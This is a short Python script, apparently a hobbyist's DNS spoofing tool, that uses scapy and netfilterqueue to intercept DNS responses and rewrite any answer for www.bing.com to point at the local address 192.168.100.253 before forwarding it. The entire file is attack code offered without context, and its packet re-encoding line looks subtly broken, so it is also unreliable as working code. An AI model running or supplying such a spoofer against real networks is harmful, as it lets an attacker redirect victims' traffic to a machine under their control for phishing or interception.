#dnspoffer
import scapy.all as scapy
import netfilterqueue
def process_packets(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname=str(scapy_packet[scapy.DNSQR].qname)
        if 'www.bing.com' in qname:
            print("[+]spoofing target")
            answer=scapy.DNSRR(rrname=qname,rdata='192.168.100.253')
            scapy_packet[scapy.DNS].an=answer
            scapy_packet[scapy.DNS].ancount=1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet).encode('utf-8'))
        print(scapy_packet.show())
    packet.accept()
queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packets)
queue.run()
